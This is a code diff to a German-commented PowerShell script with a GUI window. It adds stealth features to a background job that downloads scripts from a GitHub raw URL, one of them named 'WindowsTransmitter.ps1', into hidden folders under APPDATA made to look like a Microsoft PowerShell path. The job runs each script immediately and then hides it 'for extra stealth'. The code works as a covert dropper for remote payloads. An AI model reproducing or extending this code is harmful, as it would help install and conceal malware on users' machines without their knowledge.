@@ -9,7 +9,9 @@ try {
 
 # ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (NEU) ====================
 # Flexibler Pfad pro User (nicht hartcodiert)
-$targetDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\operation\System"
+$baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
+$operationDir = Join-Path $baseDir "operation"
+$targetDir = Join-Path $operationDir "System"
 
 # Scripts-Liste mit Raw-URLs (korrigiert für Download)
 $scripts = @(
@@ -20,27 +22,49 @@ $scripts = @(
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; FileName = "WindowsTransmitter.ps1" }
 )
 
+# Funktion zum Verstecken von Ordnern
+function Set-HiddenAttribute {
+    param($path)
+    if (Test-Path $path) {
+        Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    }
+}
+
+# Verzeichnisse erstellen und verstecken
+if (-not (Test-Path $operationDir)) {
+    New-Item -ItemType Directory -Path $operationDir -Force | Out-Null
+}
+Set-HiddenAttribute -path $operationDir
+
+if (-not (Test-Path $targetDir)) {
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+}
+Set-HiddenAttribute -path $targetDir
+
+# Log-Datei (auch hidden)
+$logPath = Join-Path $targetDir "download_errors.log"
+if (Test-Path $logPath) {
+    Set-HiddenAttribute -path $logPath
+}
+
 # Funktion zum Download und Ausführen (im Background-Job)
 $downloadJob = Start-Job -ScriptBlock {
-    param($targetDir, $scripts)
+    param($targetDir, $scripts, $logPath)
     
-    # Verzeichnis erstellen, falls nicht vorhanden
-    if (-not (Test-Path $targetDir)) {
-        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
-    }
-
     foreach ($script in $scripts) {
         $filePath = Join-Path $targetDir $script.FileName
         try {
             Invoke-WebRequest -Uri $script.Url -OutFile $filePath -UseBasicParsing
-            # Ausführen
+            # Sofort ausführen, sobald heruntergeladen
             & $filePath
+            # Optional: Hidden-Attribut für das Script setzen (für extra Stealth)
+            Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         } catch {
             # Fehler loggen (für Debugging in Labs)
-            Add-Content -Path (Join-Path $targetDir "download_errors.log") -Value "Fehler beim Download/Ausführen von $($script.FileName): $_"
+            Add-Content -Path $logPath -Value "Fehler beim Download/Ausführen von $($script.FileName): $_"
         }
     }
-} -ArgumentList $targetDir, $scripts
+} -ArgumentList $targetDir, $scripts, $logPath
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
